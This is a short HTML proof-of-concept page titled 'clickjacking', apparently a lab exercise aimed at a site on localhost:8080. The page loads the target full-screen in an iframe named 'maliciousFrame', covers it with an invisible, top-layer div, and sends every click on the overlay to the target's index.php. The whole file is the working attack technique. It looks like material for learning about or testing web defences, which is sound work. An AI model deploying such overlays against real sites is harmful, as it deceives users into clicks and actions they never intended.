<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>clickjacking</title>
    <style>
        /* Make the overlay layer transparent or hidden */
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0; /* Invisible */
            z-index: 9999; /* Ensure it's on top */
        }

        /* Style the iframe to cover the entire page */
        #maliciousFrame {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none; /* Remove iframe border */
        }
     </style> 
  </head>
  <body>
    <h1>Clickjacking</h1>
    <iframe src="http://localhost:8080/" id="maliciousFrame" width="1500px" length="900px"></iframe>
    <div id="overlay" onclick="redirect()">
    </div>
    
    <script>
      function redirect(){
        window.location.href = "http://localhost:8080/index.php";
      }
    </script>
  </body>
</html>
